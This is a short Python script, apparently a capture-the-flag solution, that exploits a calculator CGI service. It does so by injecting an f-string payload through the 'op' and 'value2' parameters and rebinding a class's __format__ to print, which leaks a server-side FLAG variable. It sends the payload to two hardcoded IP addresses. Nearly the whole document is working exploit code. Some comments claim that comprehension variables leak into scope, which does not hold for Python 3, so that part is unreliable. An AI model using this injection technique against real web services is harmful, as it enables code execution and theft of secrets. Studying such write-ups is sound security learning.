import requests
import urllib

# Let me explain the payload
# First, setting op as +f (since the server checks only the first character is valid) enables value2 to interpreted as template literals in python 3.6
# I knew the python version by flag, by brute-forcing it in another method (but didn't succeed for all characters because of length limit)

# Second, python for-loop can be used to assign a variable without assign operator.
# Third, list/generator/set/dict comprehensions includes for-loop.

[a for a in [1]]
assert a == 1
{a for a in [1]}
assert a == 1
{a for a in {1}}
assert a == 1

# And, format specifier uses __format__ of a class.
# f'{a:b}' == a.__format__('b')
# Since print is a normal function, not statement in python 3.6, I can set obj.__class__.__format__ as print by set comprehension.

# {1 for help.__class__.__format__ in {print}}
# >> help.__class__.__format__ = print
# {help:{FLAG}}
# >> print(f'{FLAG}')

URL = [
'http://178.128.96.203/cgi-bin/server.py',
'http://206.189.223.3/cgi-bin/server.py'
]
for url in URL:
	r = requests.get(url + '?' + urllib.urlencode(
		{'value1': 'what', 'op': '+f', 'value2': '{ {1 for help.__class__.__format__ in {print}} }{help:{FLAG}}'}
		))
	print r.text